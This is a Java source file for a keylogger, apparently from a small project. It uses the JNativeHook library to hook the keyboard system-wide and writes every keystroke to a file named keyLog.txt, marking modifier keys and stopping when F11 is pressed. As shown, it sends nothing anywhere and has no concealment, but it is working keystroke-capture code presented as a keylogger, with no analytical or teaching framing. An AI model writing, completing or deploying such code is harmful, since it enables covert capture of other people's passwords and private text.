package com.keylogger;

import com.github.kwhat.jnativehook.GlobalScreen;
import com.github.kwhat.jnativehook.NativeHookException;
import com.github.kwhat.jnativehook.keyboard.NativeKeyEvent;
import com.github.kwhat.jnativehook.keyboard.NativeKeyListener;

public class Main implements NativeKeyListener {

    private static IOOperations fc;

    public static void main(String[] args) {

        if(args==null || args.length==0)
            fc = new IOWrite();

        fc.initWriter("keyLog.txt");

        try {
            GlobalScreen.registerNativeHook();
        }
        catch (NativeHookException ex) {
            System.err.println("Error Occured.");
            System.err.println(ex.getMessage());
            System.exit(1);
        }

        GlobalScreen.addNativeKeyListener(new Main());
    }

    @Override
    public void nativeKeyPressed(NativeKeyEvent e)
    {
        String keyPressed = NativeKeyEvent.getKeyText(e.getKeyCode());
        System.out.println("LOG: Key Pressed: " + keyPressed);
        //System.out.println("Key Pressed: " + e.getKeyCode());
        switch(e.getKeyCode())
        {
            case NativeKeyEvent.VC_ALT: 		fc.writeString("Alt[");
                return;
            case NativeKeyEvent.VC_CONTROL: 	fc.writeString("Ctrl[");
                return;
            case NativeKeyEvent.VC_SHIFT: 	fc.writeString("^[");
                return;
            case NativeKeyEvent.VC_ENTER:	 	fc.writeEnter();
                return;
            case NativeKeyEvent.VC_BACKSPACE:	fc.writeString("(");
                fc.writeChar('\u2190');
                fc.writeString(")");
                return;
            case NativeKeyEvent.VC_SEMICOLON: 	fc.writeChar(';');
                return;
            case NativeKeyEvent.VC_PERIOD:	 	fc.writeChar('.');
                return;
            case NativeKeyEvent.VC_COMMA: 		fc.writeChar(',');
                return;
            case NativeKeyEvent.VC_BACK_SLASH: 	fc.writeChar('\\');
                return;
            case NativeKeyEvent.VC_SLASH:	 	fc.writeChar('/');
                return;
            case NativeKeyEvent.VC_MINUS:	 	fc.writeChar('-');
                return;
            case NativeKeyEvent.VC_EQUALS:	 	fc.writeChar('=');
                return;
            case NativeKeyEvent.VC_SPACE:	 	fc.writeChar(' ');
                return;
            case NativeKeyEvent.VC_OPEN_BRACKET:fc.writeChar('[');
                return;
            case NativeKeyEvent.VC_CLOSE_BRACKET:fc.writeChar(']');
                return;
            case NativeKeyEvent.VC_F11:			this.unregisterHook();
                return;
        }

        fc.writeString(keyPressed);
    }

    @Override
    public void nativeKeyReleased(NativeKeyEvent e) {
        String keyPressed = NativeKeyEvent.getKeyText(e.getKeyCode());
        if(e.getKeyCode() == NativeKeyEvent.VC_ALT || e.getKeyCode() == NativeKeyEvent.VC_CONTROL || e.getKeyCode() == NativeKeyEvent.VC_SHIFT){
            System.out.println("LOG: Key Released: " + keyPressed);
        }

        switch(e.getKeyCode())
        {
            case NativeKeyEvent.VC_ALT: 		fc.writeString("]Alt");
                return;
            case NativeKeyEvent.VC_CONTROL: 	fc.writeString("]Ctrl");
                return;
            case NativeKeyEvent.VC_SHIFT: 	fc.writeString("]^");
                return;
        }
    }


    @Override
    public void nativeKeyTyped(NativeKeyEvent e) {
        //System.out.println("Key Typed: " + NativeKeyEvent.getKeyText(e.getKeyCode()));
    }

    private void unregisterHook()
    {
        try{
            GlobalScreen.unregisterNativeHook();
            fc.closeWriter();
        }catch(Exception ex){
            System.err.println(ex.getMessage());
        }
    }

}
